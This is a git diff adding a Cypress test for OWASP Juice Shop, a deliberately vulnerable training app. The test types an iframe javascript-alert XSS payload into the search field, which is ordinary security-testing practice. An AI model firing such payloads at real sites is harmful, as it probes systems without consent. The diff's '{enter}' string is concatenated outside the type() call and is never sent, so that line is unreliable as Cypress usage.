@@ -52,4 +52,14 @@ describe("OWASP juice shop", () => {
     it("should visit the score board", () => {
         cy.visit("/#/score-board");
     })
+
+    it("should enter XSS payload into the search field", () => {
+        cy.get("button[aria-label='Close Welcome Banner']").click();
+        cy.get("a[aria-label='dismiss cookie message']").click();
+
+        const payload = '<iframe src="javascript:alert(`xss`)">';
+
+        cy.get("#searchQuery").click();
+        cy.get("#mat-input-0").clear().type(payload) + '{enter}';
+    })
 });
